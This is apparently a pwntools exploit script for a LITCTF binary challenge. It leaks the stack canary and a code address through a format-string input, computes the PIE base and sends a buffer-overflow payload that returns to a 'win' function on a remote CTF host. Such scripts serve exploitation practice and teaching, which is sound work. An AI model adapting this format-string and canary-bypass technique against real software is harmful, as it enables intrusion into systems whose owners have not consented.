#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template s
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 's')
context.terminal = ['terminator', '-e']
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("litctf.org",  31791)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
br *vuln+56
continue
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.sendline(b"%11$lx %13$lx")
canary = int(io.recvuntil(b"00"),16)
main_58 =  int(io.recv(1+16)[1:], 16)


log.info("addr: " + hex(canary))
log.info("addr: " + hex(main_58))


exe.address = main_58 - 58 - exe.symbols['main']
io.sendline(b"A"*32+b"A"*8+p64(canary)+b"C"*8+ p64(exe.sym['vuln']+115)+p64(exe.sym['win']))


io.interactive()

